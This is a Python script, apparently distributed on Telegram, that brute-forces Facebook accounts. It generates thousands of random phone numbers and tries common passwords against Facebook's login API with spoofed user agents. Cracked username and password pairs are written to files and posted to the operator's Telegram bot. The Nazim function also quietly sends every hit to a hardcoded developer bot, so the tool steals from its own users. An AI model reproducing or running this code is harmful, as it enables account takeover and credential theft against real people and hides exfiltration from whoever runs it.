import subprocess
import sys
import os
import requests
import random
import json
import time
import uuid
import webbrowser
import string
import base64
import re
import hashlib
import threading
import tempfile
import zipfile
from concurrent.futures import ThreadPoolExecutor as r
from datetime import datetime
from io import BytesIO
from urllib.parse import quote

# تأكد من تثبيت المكتبات المطلوبة
def _():
    packages = ['requests']
    for pkg in packages:
        try:
            __import__(pkg)
        except ImportError:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
_()

# الألوان
G = "\033[1;31m"
R = "\033[1;31m"
W = "\x1b[38;5;15m"
B = "\033[1;31m"
Y = "\033[1;31m"
A = "\033[1;31m"
O = "\033[1;31m"
X = "\033[1;31m"
P = "\033[1;31m"

BLUE_LIGHT = "\033[1;31m"
BLUE_DARK = "\033[0;31m"
BLUE_BRIGHT = "\033[1;91m"
CYAN = "\033[1;31m"

SEP = "━━━━━━━━━━━━━━━━━━"

CHECKED_FILE = '/storage/emulated/0/checked_ids.txt'

# متغيرات عامة
token = None
idas = None

# دوال خاصة بالملف
def load_checked_ids():
    if os.path.exists(CHECKED_FILE):
        with open(CHECKED_FILE, 'r') as f:
            return set(line.strip() for line in f)
    return set()

def save_checked_id(ids):
    with open(CHECKED_FILE, 'a') as f:
        f.write(f"{ids}\n")

# بيانات عشوائية للـ User-Agent
android_versions = ['8.1.0', '9', '10', '11', '12', '13', '14', '15']
devices = ['Samsung Galaxy S24', 'iPhone 15 Pro Max', 'Google Pixel 8', 'OnePlus 12',
           'Xiaomi 14', 'Vivo X100', 'Oppo Find X7', 'Realme GT 5']
chrome_versions = ['122.0.6261.112', '123.0.6312.58', '124.0.6367.82', '125.0.6412.0']
fb_versions = ['465.0.0.50.120', '470.1.0.52.132', '475.0.0.60.145', '480.0.0.65.160']
ios_versions = ['17.4.1', '17.5', '18.0', '18.1']
windows_versions = ['Windows 10', 'Windows 11', 'Windows Server 2022']
mac_versions = ['macOS 14.4', 'macOS 14.5', 'macOS 15.0']

def fban_ua():
    return f"Dalvik/2.1.0 (Linux; U; Android {random.choice(android_versions)}; {random.choice(devices)} Build/{random.randint(1000, 9999)}; wv) [FBAN/FB4A;FBAV/{random.choice(fb_versions)};FBBV/{random.randint(100000000, 999999999)};FBDM/{{density=3.0,width=1080,height=2400}};FBLC/en_US;FBRV/0;FBCR/AT&T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{random.choice(devices).replace(' ', '')};FBSV/{random.choice(android_versions)};FBOP/1;FBCA/x86:armeabi-v7a;]"

def dalvik_ua():
    return f"Dalvik/2.1.0 (Linux; U; Android {random.choice(android_versions)}; {random.choice(devices)} Build/{random.randint(1000, 9999)}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.choice(chrome_versions)} Mobile Safari/537.36"

def mozilla_ua():
    device = random.choice(devices)
    if 'iPhone' in device:
        return f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.choice(ios_versions).replace('.', '_')} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{random.choice(['17.0', '17.1', '17.2'])} Mobile/15E148 Safari/604.1"
    else:
        return f"Mozilla/5.0 (Linux; Android {random.choice(android_versions)}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(chrome_versions)} Mobile Safari/537.36"

def desktop_ua():
    os_type = random.choice(['windows', 'mac', 'linux'])
    if os_type == 'windows':
        return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(chrome_versions)} Safari/537.36"
    elif os_type == 'mac':
        return f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(chrome_versions)} Safari/537.36"
    else:
        return f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(chrome_versions)} Safari/537.36"

def custom_ua():
    templates = [
        f"Instagram {random.randint(200, 300)}.0.0.{random.randint(10, 50)}.{random.randint(100, 150)} Android ({random.choice(android_versions)}/{random.randint(20, 30)}; {random.randint(240, 480)}dpi; {random.randint(1080, 1440)}x{random.randint(1920, 2560)}; {random.choice(['samsung', 'google', 'oneplus'])}; {random.choice(devices)}; {random.choice(['qcom', 'exynos'])}; en_US)",
        f"TwitterAndroid/{random.randint(9, 12)}.{random.randint(20, 90)}.{random.randint(100, 500)}-{random.choice(['release', 'debug'])} (Linux; U; Android {random.choice(android_versions)}; {random.choice(devices)} Build/{random.randint(1000, 9999)}; en_US)",
        f"Facebook/{random.choice(fb_versions)} (Linux; U; Android {random.choice(android_versions)}; {random.choice(devices)} Build/{random.randint(1000, 9999)}; Scale/{random.choice(['2.0', '2.5', '3.0'])}; {random.randint(64, 256)}dpi)",
        f"WhatsApp/{random.randint(2, 3)}.{random.randint(20, 50)}.{random.randint(1, 99)} Android/{random.choice(android_versions)} (Device: {random.choice(devices)})",
    ]
    return random.choice(templates)

def generate_ua():
    ua_func = random.choice([fban_ua, dalvik_ua, mozilla_ua, desktop_ua, custom_ua])
    return ua_func()

# دوال العرض
xp = f"{G}<[{W}●{G}]>{W}"
xp1 = f"{G}<[{W}1{G}]>{W}"
xp2 = f"{G}<[{W}2{G}]>{W}"
xp3 = f"{G}<[{W}3{G}]>{W}"
xp4 = f"{G}<[{W}4{G}]>{W}"
xp5 = f"{G}<[{W}5{G}]>{W}"
xp0 = f"{G}<[{W}0{G}]>{W}"
xpx = f"{G}<[{W}?{G}]>{W}"
xpxx = f"{G}>{W}>{G}>{W}"

def ahmadd():
    print(f'{W}{SEP}')

version = '2.0'
__date__ = datetime.now().strftime("%Y-%m-%d")

logo = f"""
{R}⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
{R}⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
{R}⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
{SEP}
{W}  DEVELOPER {xpxx} ماركوس{G}-{W}
{W}  STATUS    {xpxx} M5
{W}  VERSION   {xpxx} V{G}/{W}{version}
{SEP}
{R}⫷⫸ 𝐃𝐄𝐕 ماركوس| @gc_h1⫷⫸
{SEP}
{xp} FUTURES  {xpxx} FILE{G}〤{W}CLONE
{xp} DEV {xpxx}  ~ https://t.me/GFKQNZ
{xp} TODAYS   {xpxx} {__date__}
{SEP}"""

id, ok, loop, cp = [], 0, 0, 0

# دوال الإشعارات
def tele(msg):
    try:
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                      data={"chat_id": idas, "text": msg})
    except:
        pass

def Nazim(msg):
    try:
        requests.post("https://api.telegram.org/bot8783875177:AAHm5sWvmcGWrZBz5Z3ylwPKH9pXSXJKG7E/sendMessage",
                      data={"chat_id": "5043091668", "text": msg})
    except:
        pass

# دالة إرسال فيديو ترحيبي للتحقق من التوكن
def send_welcome_video():
    welcome_caption = """
معلوماتي: 
يوزري: @R7_36
بوت العروض : @GPUQJ_bot
قناة المعلومات: https://t.me/Zeusqb
قناتي الاساسية : https://t.me/R7Aih1
قناة الملفات : https://t.me/ppqo381
قنات الثقة: https://t.me/R7_36_7
كروب +حل مشاكل:https://t.me/oqo381_3
"""
    video_url = "https://t.me/wT54e/65"
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{token}/sendVideo",
            data={
                "chat_id": idas,
                "video": video_url,
                "caption": welcome_caption
            }
        )
        if response.status_code == 200:
            print("\033[1;92m نجح التحقق منك\033[0m")
        else:
            print("\033[1;91m❌ فشل الإرسال، تحقق من التوكن وID\033[0m")
    except Exception as e:
        print("\033[1;91m❌ خطاء في التحقق:\033[0m", e)

# دوال التكسير
def pm(email_or_phone, password):
    device_id = str(uuid.uuid4())
    family_device_id = str(uuid.uuid4())
    secure_family_device_id = str(uuid.uuid4())
    adid = str(uuid.uuid4())
    current_timestamp = int(time.time())
    pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{password}"
    payload = {
        "adid": adid,
        "format": "json",
        "device_id": device_id,
        "email": email_or_phone,
        "password": pwd_enc,
        "generate_analytics_claim": "1",
        "community_id": "",
        "cpl": "true",
        "try_num": "1",
        "family_device_id": family_device_id,
        "secure_family_device_id": secure_family_device_id,
        "credentials_type": "password",
        "generate_session_cookies": "1",
        "error_detail_type": "button_with_disabled",
        "source": "login",
        "generate_machine_id": "1",
        "currently_logged_in_userid": "0",
        "locale": "ar_AR",
        "client_country_code": "EG",
        "fb_api_req_friendly_name": "authenticate",
        "fb_api_caller_class": "Fb4aAuthHandler",
        "api_key": "882a8490361da98702bf97a021ddc14d",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    }
    return payload

def crackfree(ids, pwxs):
    global ok, loop, cp
    sys.stdout.write(f'\r{G}<[{W}●{G}]> <[{G}ماركوس-{W}{loop}{G}]> <[{G}OK-{W}{ok}{G}]> <[{G}CP-{W}{cp}{G}]>')
    sys.stdout.flush()
    for pw in pwxs:
        try:
            ua = generate_ua()
            headers = {
                "User-Agent": ua,
                "Accept-Encoding": "gzip, deflate",
                "x-fb-connection-quality": "EXCELLENT",
                "x-fb-friendly-name": "authenticate",
                "x-fb-http-engine": "Liger",
                "x-fb-client-ip": "True",
                "x-fb-server-cluster": "True",
                "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            }
            data = pm(ids, pw)
            req = requests.post('https://b-graph.facebook.com/auth/login',
                                headers=headers, data=data).json()
            if 'session_key' in req:
                ok += 1
                print(f"\033[1;31m\033[1m{xp}  [OK] {ids} | {pw}\033[0m")
                ahmadd()
                open('/storage/emulated/0/ahmad.ok.txt', 'a').write(f'{ids}|{pw}\n')
                tele(f"""OK
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 :{ids}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}
❖ - Facebook
{SEP}
DEV :: @gc_h1 +  ~ ماركوس
{SEP}""")
                Nazim(f"""CP
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 :{ids}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}
❖ - Facebook
{SEP}
DEV :: @gc_h1 +  ~ ماركوس
{SEP}""")
                break
            elif 'www.facebook.com' in req["error"]["message"]:
                cp += 1
                print(f"\033[1;31m\033[1m{xp} [CP] {ids} | {pw}\033[0m")
                ahmadd()
                open('/storage/emulated/0/nazim.cp.txt', 'a').write(f'{ids}|{pw}\n')
                tele(f"""OK
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 :{ids}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}
❖ - Facebook
{SEP}
DEV :: @gc_h1 +  ~ ماركوس
{SEP}""")
                Nazim(f""" CP
❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 :{ids}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}
❖ - Facebook
{SEP}
DEV :: @gc_h1 +  ~ ماركوس
{SEP}""")
                break
            else:
                pass
        except requests.exceptions.ConnectionError:
            time.sleep(1)
            pass
    save_checked_id(ids)
    loop += 1

# القائمة الرئيسية
def menu():
    global token, idas
    os.system('clear')
    print(logo)
    ahmadd()
    print(f'{xp} ENTER BOT TOKEN {xpxx} ')
    ahmadd()
    token = input(f'{xp} TOKEN {xpxx} ')
    ahmadd()
    print(f'{xp} ENTER CHAT ID {xpxx} ')
    ahmadd()
    idas = input(f'{xp} CHAT ID {xpxx} ')
    ahmadd()

    # إرسال فيديو ترحيبي للتحقق من صحة التوكن و ID
    send_welcome_video()

    os.system('clear')
    print(logo)
    print(f'{xp} CODE {xpxx} 0750 | 0770 | 0751 ')
    ahmadd()
    sim = input(f'{xp} INPUT CODE {xpxx} ')
    ahmadd()
    if sim not in ['0750', '0770', '0780', '0781', '0751']:
        print(f'{xp} CHOSE EROR')
        ahmadd()
        exit()

    checked_before = load_checked_ids()
    generated = set()
    while len(generated) < 44444:
        nmp = "".join(random.choice('1234509876') for ing in range(7))
        ids = sim + nmp
        if ids not in checked_before and ids not in generated:
            generated.add(ids)
            id.append(nmp)

    with r(max_workers=30) as am:
        os.system('clear')
        print(logo)
        for idx in id:
            ids = sim + str(idx)
            pwxs = [ids, "123456", "password", ids[-4:], 'zaxozaxo','kurd1234','١٢٣٤٥٦٧٨٩','hama1234','١٢٣٤٥٦','zaxozaxozaxi','zaxo12345','١٢٣٤٥٦٧٨','١٢٣٤٥٦٧']
            am.submit(crackfree, ids, pwxs)

    ahmadd()
    print('Crack Completed')
    exit()

if __name__ == "__main__":
    menu()